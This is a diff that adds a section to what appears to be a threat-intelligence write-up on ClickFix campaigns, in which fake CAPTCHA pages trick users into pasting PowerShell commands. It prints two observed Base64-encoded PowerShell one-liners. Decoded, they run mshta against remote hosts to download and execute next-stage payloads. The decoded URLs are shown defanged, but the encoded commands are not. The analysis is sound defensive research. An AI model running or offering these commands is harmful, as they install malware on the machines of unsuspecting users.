@@ -93,6 +93,27 @@ The fake website displayed a CAPTCHA verification prompt as part of the ClickFix
 Once installed, ScreenConnect provided attackers with remote access to the victim's system, allowing them to steal data, deploy additional malware, or maintain persistent access.
 
 ---
+
+In several ClickFix campaigns, the fake verification page acts as a CAPTCHA challenge that secretly copies an encoded PowerShell command to the user's clipboard and instructs them to execute it manually.
+
+Examples of observed commands include:
+
+* `powershell.exe -eC bQBzAGgAdABhACAAIgBoAHQAdABwAHMAOgAvAC8AegBvAG4AZQAxADAALgBiAC0AYwBkAG4ALgBuAGUAdAAvAHMAZQB0ACIA`
+* `powershell.exe -eC bQBzAGgAdABhACAAaAB0AHQAcABzADoALwAvAG0AeQBhAHAAdAA2ADcALgBzADMALgBhAG0AYQB6AG8AbgBhAHcAcwAuAGMAbwBtAC8AcABnAHIAdAB4AA==`
+
+The -eC parameter instructs PowerShell to execute Base64-encoded commands. After decoding, the commands resolve to:
+
+mshta "hxxps://zone10[.]b-cdn[.]net/set"
+![Fig7](/assets/images/posts/Clickfix/Vt1.png)
+
+mshta hxxps://myapt67[.]s3[.]amazonaws[.]com/pgrtx
+![Fig8](/assets/images/posts/Clickfix/vt2.png)
+
+
+The victim is then guided to open PowerShell or Windows Terminal and paste the command, resulting in the download and execution of the next-stage payload.
+
+
+---
 ---
 
 # MITRE ATT&CK Mapping
